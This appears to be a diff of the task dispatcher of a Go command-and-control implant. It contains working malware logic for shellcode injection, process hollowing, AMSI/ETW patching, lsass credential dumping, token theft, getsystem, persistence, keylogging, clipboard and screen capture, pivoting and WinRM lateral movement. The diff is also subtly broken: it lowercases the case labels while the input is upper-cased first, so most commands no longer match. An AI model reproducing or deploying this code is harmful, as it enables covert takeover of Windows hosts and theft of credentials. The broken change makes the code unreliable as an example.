@@ -201,7 +201,7 @@ func dispatchTask(t transport, task taskWire) {
 	// normalize the wire type so "shell" and "SHELL" behave identically.
 	task.Type = strings.ToUpper(strings.TrimSpace(task.Type))
 	switch task.Type {
-	case "SHELL":
+	case "shell":
 		output, err := runShell(task.Args)
 		errStr := ""
 		if err != nil {
@@ -209,10 +209,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
-	case "SHELL_OPSEC":
+	case "shell_opsec":
 		t.sendResult(task.ID, runShellOpsec(task.Args), "")
 
-	case "SLEEP":
+	case "sleep":
 		var args struct {
 			Sec    int `json:"sec"`
 			Jitter int `json:"jitter"`
@@ -222,7 +222,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "sleep updated", "")
 
-	case "SLEEP_UNTIL":
+	case "sleep_until":
 		raw := strings.TrimSpace(task.Args)
 		var ts time.Time
 		var parseErr error
@@ -240,15 +240,15 @@ func dispatchTask(t transport, task taskWire) {
 		SleepUntil = ts
 		t.sendResult(task.ID, fmt.Sprintf("[+] sleeping until %s", ts.Format(time.RFC3339)), "")
 
-	case "JOBS":
+	case "jobs":
 		t.sendResult(task.ID, jobList(), "")
 
-	case "SHUTDOWN":
+	case "shutdown":
 		reboot := strings.ToLower(strings.TrimSpace(task.Args)) == "reboot"
 		t.sendResult(task.ID, fmt.Sprintf("[+] initiating %s", map[bool]string{true: "reboot", false: "shutdown"}[reboot]), "")
 		go shutdownHost(reboot)
 
-	case "POWERSHELL":
+	case "powershell":
 		var psArgs struct {
 			Cmd   string   `json:"cmd"`
 			Stdin []string `json:"stdin"`
@@ -263,7 +263,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "CONFIG":
+	case "config":
 		var cfg struct {
 			SleepSec     int    `json:"sleep_sec"`
 			JitterPct    int    `json:"jitter_pct"`
@@ -313,13 +313,13 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, msg, "")
 
-	case "SYSINFO":
+	case "sysinfo":
 		info := getSysInfo()
 		out := fmt.Sprintf("hostname=%s user=%s os=%s pid=%d",
 			info.Hostname, info.Username, info.OS, info.PID)
 		t.sendResult(task.ID, out, "")
 
-	case "DOWNLOAD":
+	case "download":
 		var args struct {
 			Path string `json:"path"`
 		}
@@ -344,7 +344,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("uploaded %s (%d bytes)", filename, len(data)), "")
 
-	case "UPLOAD":
+	case "upload":
 		var args struct {
 			Filename   string `json:"filename"`
 			RemotePath string `json:"remote_path"`
@@ -370,7 +370,7 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("written %d bytes to %s", len(data), dest), "")
 
 	// ── REMOTE_UPLOAD_SCP ────────────────────────────────────────────────────
-	case "REMOTE_UPLOAD_SCP":
+	case "remote_upload_scp":
 		var ra struct {
 			Host string `json:"host"`
 			User string `json:"user"`
@@ -390,13 +390,13 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, "", "read src: "+err.Error())
 			return
 		}
-		if err := scpUpload(ra.Host, ra.User, ra.Pass, ra.Dst, data); err != nil {
+		if err := scpUploadAddr(ra.Host, ra.User, ra.Pass, ra.Dst, data); err != nil {
 			t.sendResult(task.ID, "", err.Error())
 			return
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] uploaded %d bytes to %s:%s", len(data), ra.Host, ra.Dst), "")
 
-	case "STAGE2":
+	case "stage2":
 		if task.Payload == "" {
 			t.sendResult(task.ID, "", "empty shellcode payload")
 			return
@@ -409,7 +409,7 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("injecting %d bytes", len(sc)), "")
 		go func() { injectShellcode(sc) }()
 
-	case "BOF":
+	case "bof":
 		output, err := dispatchBOF(task)
 		errStr := ""
 		if err != nil {
@@ -417,10 +417,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
-	case "CLR_STOMP":
+	case "clr_stomp":
 		t.sendResult(task.ID, clrStomp(), "")
 
-	case "DOTNET_EXEC":
+	case "dotnet_exec":
 		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
 		var da struct {
 			Asm        string `json:"asm"`
@@ -459,30 +459,30 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
-	case "BOF_LIST":
+	case "bof_list":
 		t.sendResult(task.ID, "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "")
 
-	case "HOOK_CHECK":
+	case "hook_check":
 		t.sendResult(task.ID, checkHooks(), "")
 
-	case "AMSI_BYPASS":
+	case "amsi_bypass":
 		patchAMSI()
 		patchETW()
 		disableETWProcess()
 		t.sendResult(task.ID, "[+] AMSI/ETW re-patched", "")
 
-	case "NTDLL_UNHOOK":
+	case "ntdll_unhook":
 		unhookNtdll()
 		t.sendResult(task.ID, "[+] ntdll.dll re-mapped from disk", "")
 
-	case "HW_BP_CHECK":
+	case "hw_bp_check":
 		if hasHWBreakpoints() {
 			t.sendResult(task.ID, "[!] Hardware breakpoints DETECTED on current thread (DR0-DR3 non-zero)", "")
 		} else {
 			t.sendResult(task.ID, "[+] No hardware breakpoints detected", "")
 		}
 
-	case "THREAD_HIJACK":
+	case "thread_hijack":
 		// Args: "<pid>"  Payload: shellcode (base64)
 		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
 		if err != nil {
@@ -501,7 +501,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "MEM_FLUCTUATE":
+	case "mem_fluctuate":
 		// Args: "start [interval_sec]" | "stop"
 		parts := strings.Fields(task.Args)
 		if len(parts) == 0 || parts[0] == "stop" {
@@ -520,7 +520,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Filesystem ────────────────────────────────────────────────────────────
 
-	case "DRIVES":
+	case "drives":
 		out, err := listDrivesJSON()
 		errStr := ""
 		if err != nil {
@@ -528,7 +528,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "NET_SHARES":
+	case "net_shares":
 		host := strings.TrimLeft(strings.TrimSpace(task.Args), "\\/")
 		out, err := netSharesJSON(host)
 		errStr := ""
@@ -537,7 +537,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "PWD":
+	case "pwd":
 		wd, err := os.Getwd()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -545,7 +545,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, wd, "")
 
-	case "CD":
+	case "cd":
 		path := strings.TrimSpace(task.Args)
 		if path == "" {
 			home, _ := os.UserHomeDir()
@@ -558,7 +558,7 @@ func dispatchTask(t transport, task taskWire) {
 		wd, _ := os.Getwd()
 		t.sendResult(task.ID, wd, "")
 
-	case "LS":
+	case "ls":
 		path := strings.TrimSpace(task.Args)
 		if path == "" {
 			path = "."
@@ -579,7 +579,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, sb.String(), "")
 
-	case "LS_JSON":
+	case "ls_json":
 		path := strings.TrimSpace(task.Args)
 		if path == "" {
 			path = "."
@@ -615,7 +615,7 @@ func dispatchTask(t transport, task taskWire) {
 		})
 		t.sendResult(task.ID, string(data), "")
 
-	case "PS_JSON":
+	case "ps_json":
 		output, err := listProcessesJSON()
 		errStr := ""
 		if err != nil {
@@ -623,7 +623,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
-	case "MKDIR":
+	case "mkdir":
 		path := strings.TrimSpace(task.Args)
 		if err := os.MkdirAll(path, 0755); err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -631,7 +631,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "created: "+path, "")
 
-	case "RM":
+	case "rm":
 		path := strings.TrimSpace(task.Args)
 		if err := os.RemoveAll(path); err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -639,14 +639,14 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "removed: "+path, "")
 
-	case "ENV":
+	case "env":
 		var sb strings.Builder
 		for _, e := range os.Environ() {
 			sb.WriteString(e + "\n")
 		}
 		t.sendResult(task.ID, sb.String(), "")
 
-	case "CAT":
+	case "cat":
 		data, err := os.ReadFile(strings.TrimSpace(task.Args))
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -654,7 +654,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, string(data), "")
 
-	case "CP", "MV":
+	case "cp", "MV":
 		a, _ := parseFSTaskArgs(task.Args)
 		if a.Src == "" || a.Dst == "" {
 			t.sendResult(task.ID, "", "usage: {src,dst}")
@@ -681,7 +681,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] %s %s → %s", strings.ToLower(task.Type), a.Src, a.Dst), "")
 
-	case "GREP":
+	case "grep":
 		a, _ := parseFSTaskArgs(task.Args)
 		if a.Pattern == "" || a.Path == "" {
 			t.sendResult(task.ID, "", "usage: {pattern,path}")
@@ -694,7 +694,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, "")
 
-	case "MOUNT":
+	case "mount":
 		arg := strings.TrimSpace(task.Args)
 		if strings.HasPrefix(arg, "{") {
 			var a fsTaskArgs
@@ -712,7 +712,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "CHMOD":
+	case "chmod":
 		a, _ := parseFSTaskArgs(task.Args)
 		mode, err := strconv.ParseUint(strings.TrimPrefix(strings.TrimSpace(a.Mode), "0o"), 8, 32)
 		if err != nil || a.Path == "" {
@@ -725,7 +725,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] chmod %s %s", a.Mode, a.Path), "")
 
-	case "CHOWN":
+	case "chown":
 		a, _ := parseFSTaskArgs(task.Args)
 		if runtime.GOOS == "windows" {
 			t.sendResult(task.ID, "", "chown: not supported on Windows")
@@ -746,7 +746,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "CHTIMES":
+	case "chtimes":
 		a, _ := parseFSTaskArgs(task.Args)
 		if a.Path == "" || a.MTime == "" {
 			t.sendResult(task.ID, "", "usage: {mtime,path}")
@@ -773,10 +773,10 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Process ───────────────────────────────────────────────────────────────
 
-	case "GETPID":
+	case "getpid":
 		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getpid()), "")
 
-	case "PPID":
+	case "ppid":
 		var pa struct {
 			Cmd    string `json:"cmd"`
 			Parent string `json:"parent"`
@@ -789,7 +789,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, spawnWithPPID(pa.Cmd, pa.Parent), "")
 
-	case "EVASION_STATUS":
+	case "evasion_status":
 		spoofGadget := getSpoofGadgetAddr()
 		status := fmt.Sprintf(
 			"SleepMaskMode : %s\nEvasionPatches: %s\nAMSIMethod    : %s\nPPIDSpoof     : %s\nSpoofGadget   : 0x%x\n",
@@ -797,7 +797,7 @@ func dispatchTask(t transport, task taskWire) {
 		)
 		t.sendResult(task.ID, status, "")
 
-	case "PS":
+	case "ps":
 		output, err := listProcesses()
 		errStr := ""
 		if err != nil {
@@ -807,13 +807,13 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Cleanup ───────────────────────────────────────────────────────────────
 
-	case "CLEANUP":
+	case "cleanup":
 		t.sendResult(task.ID, "cleaning up...", "")
 		go selfCleanup()
 
 	// ── Pivot ─────────────────────────────────────────────────────────────────
 
-	case "SOCKS_START":
+	case "socks_start":
 		// Args: JSON {port,user,pass}; accept the legacy text form too.
 		parts := strings.Fields(task.Args)
 		port := 1080
@@ -847,11 +847,11 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, msg, "")
 
-	case "SOCKS_STOP":
+	case "socks_stop":
 		stopSOCKS5()
 		t.sendResult(task.ID, "SOCKS5 stopped", "")
 
-	case "PORTFWD_ADD":
+	case "portfwd_add":
 		// Args: "[proto] <lport> <rhost> <rport>"  proto defaults to "tcp"
 		parts := strings.Fields(task.Args)
 		proto := "tcp"
@@ -875,7 +875,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("%s forwarding :%d → %s:%d", proto, lport, parts[1], rport), "")
 
-	case "PORTFWD_DEL":
+	case "portfwd_del":
 		// Args: "[proto] <lport>"
 		parts := strings.Fields(task.Args)
 		proto := "tcp"
@@ -894,12 +894,12 @@ func dispatchTask(t transport, task taskWire) {
 		delPortFwdProto(proto, lport)
 		t.sendResult(task.ID, fmt.Sprintf("%s port forward :%d removed", proto, lport), "")
 
-	case "PORTFWD_LIST":
+	case "portfwd_list":
 		t.sendResult(task.ID, listPortFwds(), "")
 
 	// ── Windows-specific (stubs on other platforms) ────────────────────────────
 
-	case "SCREENSHOT":
+	case "screenshot":
 		output, err := takeScreenshot(t, task.ID)
 		errStr := ""
 		if err != nil {
@@ -907,7 +907,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, output, errStr)
 
-	case "INJECT_REMOTE":
+	case "inject_remote":
 		// Args: "<pid>" Payload: shellcode (base64)
 		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
 		if err != nil {
@@ -925,7 +925,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("injected %d bytes into PID %d", len(sc), pid), "")
 
-	case "TOKEN_STEAL", "STEAL_TOKEN":
+	case "token_steal", "STEAL_TOKEN":
 		var pid int
 		argStr := strings.TrimSpace(task.Args)
 		if len(argStr) > 0 && argStr[0] == '{' {
@@ -949,7 +949,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "TOKEN_MAKE":
+	case "token_make":
 		var tm struct {
 			User    string `json:"user"`
 			Pass    string `json:"pass"`
@@ -976,7 +976,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "TOKEN_FROM_HANDLE":
+	case "token_from_handle":
 		raw := strings.TrimSpace(task.Args)
 		var handleVal uint64
 		var parseErr error
@@ -996,7 +996,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "RUN_AS":
+	case "run_as":
 		var ra struct {
 			User string `json:"user"`
 			Pass string `json:"pass"`
@@ -1017,7 +1017,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "PRIV_LIST", "PRIVILEGE_LIST":
+	case "priv_list", "PRIVILEGE_LIST":
 		out, err := privList()
 		errStr := ""
 		if err != nil {
@@ -1025,7 +1025,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "PRIV_ENABLE", "PRIVILEGE_ENABLE":
+	case "priv_enable", "PRIVILEGE_ENABLE":
 		out, err := privEnable(task.Args)
 		errStr := ""
 		if err != nil {
@@ -1033,7 +1033,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "PRIV_DISABLE", "PRIVILEGE_DISABLE":
+	case "priv_disable", "PRIVILEGE_DISABLE":
 		out, err := privDisable(task.Args)
 		errStr := ""
 		if err != nil {
@@ -1041,7 +1041,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "ASM_STORE_LOAD":
+	case "asm_store_load":
 		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
 		if len(parts) < 2 {
 			t.sendResult(task.ID, "", "usage: ASM_STORE_LOAD <name> <base64_exe>")
@@ -1055,13 +1055,13 @@ func dispatchTask(t transport, task taskWire) {
 		asmStoreLoad(strings.TrimSpace(parts[0]), asmBytes)
 		t.sendResult(task.ID, fmt.Sprintf("[+] loaded %d bytes as '%s'", len(asmBytes), strings.TrimSpace(parts[0])), "")
 
-	case "ASM_STORE_LIST":
+	case "asm_store_list":
 		t.sendResult(task.ID, asmStoreList(), "")
 
-	case "ASM_STORE_UNLOAD":
+	case "asm_store_unload":
 		t.sendResult(task.ID, asmStoreUnload(strings.TrimSpace(task.Args)), "")
 
-	case "POWERPICK":
+	case "powerpick":
 		script := strings.TrimSpace(task.Args)
 		if script == "" {
 			t.sendResult(task.ID, "", "usage: POWERPICK <powershell script>")
@@ -1090,7 +1090,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "TOKEN_DROP", "REV2SELF":
+	case "token_drop", "REV2SELF":
 		out, err := dropToken()
 		errStr := ""
 		if err != nil {
@@ -1098,10 +1098,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "TOKEN_WHOAMI":
+	case "token_whoami":
 		t.sendResult(task.ID, tokenWhoami(), "")
 
-	case "GETSYSTEM":
+	case "getsystem":
 		out, ok := GetSystem()
 		if ok {
 			t.sendResultAdmin(task.ID, out, "", true)
@@ -1109,7 +1109,7 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, out, "")
 		}
 
-	case "PERSIST", "PERSIST_TASK", "PERSIST_RM":
+	case "persist", "PERSIST_TASK", "PERSIST_RM":
 		// PERSIST_TASK → schtask method; PERSIST_RM → remove; PERSIST → explicit method
 		var pa struct {
 			Method string `json:"method"`
@@ -1117,7 +1117,7 @@ func dispatchTask(t transport, task taskWire) {
 			Name   string `json:"name"`
 		}
 		switch task.Type {
-		case "PERSIST_TASK":
+		case "persist_task":
 			pa.Method = "schtask"
 			pa.Name = strings.TrimSpace(task.Args)
 			if exe, err := os.Executable(); err == nil {
@@ -1125,7 +1125,7 @@ func dispatchTask(t transport, task taskWire) {
 			} else {
 				pa.Cmd = os.Args[0]
 			}
-		case "PERSIST_RM":
+		case "persist_rm":
 			pa.Method = "rm"
 			if err := json.Unmarshal([]byte(task.Args), &pa); err != nil {
 				pa.Name = strings.TrimSpace(task.Args)
@@ -1157,7 +1157,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "FORK_RUN":
+	case "fork_run":
 		// Args JSON: {"cmd":"<sacrificial_process>"} (optional). Payload: shellcode.
 		sc, err := base64.StdEncoding.DecodeString(task.Payload)
 		if err != nil {
@@ -1175,7 +1175,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "HOLLOW":
+	case "hollow":
 		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename_optional>"}
 		// Shellcode bytes may arrive in task.Payload (base64) or be downloaded by name from args.payload.
 		var ha struct {
@@ -1208,7 +1208,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "SHELLCODE_STOMP":
+	case "shellcode_stomp":
 		// Args JSON (optional): {"dll":"<target_dll_name>"} — omit for auto-pick
 		var sa struct {
 			DLL string `json:"dll"`
@@ -1225,7 +1225,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, shellcodeStomp(scBytes, sa.DLL), "")
 
-	case "UDRL":
+	case "udrl":
 		// Args JSON: {"payload":"<uploaded_filename>","host_dll":"<optional override>"}
 		var ua struct {
 			Payload string `json:"payload"`
@@ -1247,7 +1247,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "BLOCKDLLS":
+	case "blockdlls":
 		// Args: "on" or "off"
 		enable := strings.ToLower(strings.TrimSpace(task.Args)) != "off"
 		out, err := blockDLLs(enable)
@@ -1257,7 +1257,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "GEN_LNK":
+	case "gen_lnk":
 		// Args JSON: {"target":"...","args":"...","working_dir":"...","icon_path":"...","icon_index":0,"outfile":"..."}
 		var opts GenLNKOptions
 		if err := json.Unmarshal([]byte(task.Args), &opts); err != nil {
@@ -1271,7 +1271,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "COM_HIJACK":
+	case "com_hijack":
 		// Args JSON: {"clsid":"...","dll":"...","name":"..."}  or "rm <clsid>"
 		if strings.HasPrefix(strings.TrimSpace(task.Args), "rm ") {
 			clsid := strings.TrimSpace(strings.TrimPrefix(task.Args, "rm "))
@@ -1299,7 +1299,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "MINIDUMP":
+	case "minidump":
 		// Args: optional PID (0 = auto-find lsass.exe)
 		var pid uint32
 		if task.Args != "" {
@@ -1318,7 +1318,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("lsass dump uploaded (%d bytes)", len(data)), "")
 
-	case "LSASS_DUMP_NT":
+	case "lsass_dump_nt":
 		// NtReadVirtualMemory-based lsass dump; builds MDMP without MiniDumpWriteDump.
 		// Args: optional PID (0 = auto-find lsass.exe)
 		var pid2 uint32
@@ -1338,7 +1338,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("lsass NT dump uploaded (%d bytes)", len(data2)), "")
 
-	case "PORT_SCAN":
+	case "port_scan":
 		// Args: "<target> [ports|method] [timeout_ms]"
 		// Discovery methods: arp, icmp, tcp, auto (default: auto = ARP→ICMP→TCP)
 		// If second arg is a method keyword → host-discovery with that method.
@@ -1389,7 +1389,7 @@ func dispatchTask(t transport, task taskWire) {
 			t.sendResult(task.ID, out, "")
 		}
 
-	case "INJECT_APC":
+	case "inject_apc":
 		// Early-bird APC injection. Args: process (optional). Payload: shellcode.
 		sc, err := base64.StdEncoding.DecodeString(task.Payload)
 		if err != nil {
@@ -1420,7 +1420,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Keylogger ─────────────────────────────────────────────────────────────
 
-	case "KEYLOG_START":
+	case "keylog_start":
 		out, err := startKeylog()
 		errStr := ""
 		if err != nil {
@@ -1428,7 +1428,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "KEYLOG_STOP":
+	case "keylog_stop":
 		out, err := stopKeylog()
 		errStr := ""
 		if err != nil {
@@ -1436,10 +1436,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "KEYLOG_DUMP":
+	case "keylog_dump":
 		t.sendResult(task.ID, dumpKeylog(), "")
 
-	case "CLIP_GET":
+	case "clip_get":
 		out, err := getClipboard()
 		errStr := ""
 		if err != nil {
@@ -1447,7 +1447,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "CLIP_MONITOR_START":
+	case "clip_monitor_start":
 		interval := 5
 		if task.Args != "" {
 			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
@@ -1461,17 +1461,17 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "CLIP_MONITOR_DUMP":
+	case "clip_monitor_dump":
 		t.sendResult(task.ID, dumpClipMonitor(), "")
 
-	case "CLIP_MONITOR_STOP":
+	case "clip_monitor_stop":
 		t.sendResult(task.ID, stopClipMonitor(), "")
 
 	// ── HTTP reverse-proxy pivot ──────────────────────────────────────────────
 
 	// ── Reverse SOCKS5 ───────────────────────────────────────────────────────
 
-	case "RSOCKS_START":
+	case "rsocks_start":
 		port := strings.TrimSpace(task.Args)
 		if port == "" {
 			t.sendResult(task.ID, "", "usage: RSOCKS_START <callback_port>")
@@ -1483,10 +1483,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "[+] reverse SOCKS5 tunnel established (callback port "+port+")", "")
 
-	case "RSOCKS_STOP":
+	case "rsocks_stop":
 		t.sendResult(task.ID, stopRSocks(), "")
 
-	case "HTTP_PIVOT_START":
+	case "http_pivot_start":
 		port := 8888
 		if task.Args != "" {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
@@ -1506,10 +1506,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] HTTP pivot listening on :%d", port), "")
 
-	case "HTTP_PIVOT_STOP":
+	case "http_pivot_stop":
 		t.sendResult(task.ID, stopHTTPPivot(), "")
 
-	case "TCP_PIVOT_START":
+	case "tcp_pivot_start":
 		port := 4444
 		if task.Args != "" {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
@@ -1529,7 +1529,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] TCP pivot listening on :%d", port), "")
 
-	case "TCP_PIVOT_STOP":
+	case "tcp_pivot_stop":
 		port := 0
 		if task.Args != "" {
 			if p, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil {
@@ -1540,7 +1540,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── SMB named pipe pivot server ───────────────────────────────────────────
 
-	case "PIPE_START":
+	case "pipe_start":
 		pipeName := strings.TrimSpace(task.Args)
 		if err := startPipeServer(pipeName); err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -1552,13 +1552,13 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "[+] pipe server listening on "+pipe, "")
 
-	case "PIPE_STOP":
+	case "pipe_stop":
 		// Args: optional pipe name to stop; empty = stop all
 		t.sendResult(task.ID, stopPipeServer(strings.TrimSpace(task.Args)), "")
 
 	// ── WinRM lateral movement ────────────────────────────────────────────────
 
-	case "WINRM_EXEC":
+	case "winrm_exec":
 		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","cmd":"whoami"}
 		var wa struct {
 			Target string `json:"target"`
@@ -1577,7 +1577,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "WINRM_DEPLOY":
+	case "winrm_deploy":
 		// Args JSON: {"target":"host","user":"dom\\user","pass":"pwd","payload":"<PS one-liner>"}
 		var wa struct {
 			Target  string `json:"target"`
@@ -1596,7 +1596,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "ISHELL_OPEN":
+	case "ishell_open":
 		shell := strings.ToLower(strings.TrimSpace(task.Args))
 		// The web UI sends {"shell":"cmd|ps"}; older clients sent the
 		// shell name directly. Accept both wire formats.
@@ -1614,7 +1614,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, "[+] interactive shell active", "")
 
-	case "ISHELL_RUN":
+	case "ishell_run":
 		cmdLine := task.Args
 		// Keep accepting the former {"cmd":"..."} envelope as well as
 		// the current raw command text (which also permits PowerShell blocks).
@@ -1633,17 +1633,17 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "ISHELL_CLOSE":
+	case "ishell_close":
 		ishellClose()
 		t.sendResult(task.ID, "[+] shell closed", "")
 
-	case "KILL":
+	case "kill":
 		t.sendResult(task.ID, "bye", "")
 		os.Exit(0)
 
 	// ── Token Store ───────────────────────────────────────────────────────────
 
-	case "TOKEN_STORE_STEAL":
+	case "token_store_steal":
 		pid, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32)
 		if err != nil {
 			t.sendResult(task.ID, "", "invalid pid: "+err.Error())
@@ -1656,10 +1656,10 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] token #%d stolen from PID %d (%s)", id, pid, user), "")
 
-	case "TOKEN_STORE_SHOW":
+	case "token_store_show":
 		t.sendResult(task.ID, tsShowStore(), "")
 
-	case "TOKEN_STORE_USE":
+	case "token_store_use":
 		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
 		if err != nil {
 			t.sendResult(task.ID, "", "invalid id: "+err.Error())
@@ -1667,7 +1667,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, tsUseStore(id), "")
 
-	case "TOKEN_STORE_REMOVE":
+	case "token_store_remove":
 		id, err := strconv.Atoi(strings.TrimSpace(task.Args))
 		if err != nil {
 			t.sendResult(task.ID, "", "invalid id: "+err.Error())
@@ -1675,12 +1675,12 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, tsRemoveStore(id), "")
 
-	case "TOKEN_STORE_CLEAR":
+	case "token_store_clear":
 		t.sendResult(task.ID, tsClearStore(), "")
 
 	// ── Screenwatch ───────────────────────────────────────────────────────────
 
-	case "SCREENWATCH_START":
+	case "screenwatch_start":
 		intervalSec := 30
 		if task.Args != "" {
 			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
@@ -1690,12 +1690,12 @@ func dispatchTask(t transport, task taskWire) {
 		startScreenWatchCmd(t, task.ID, intervalSec)
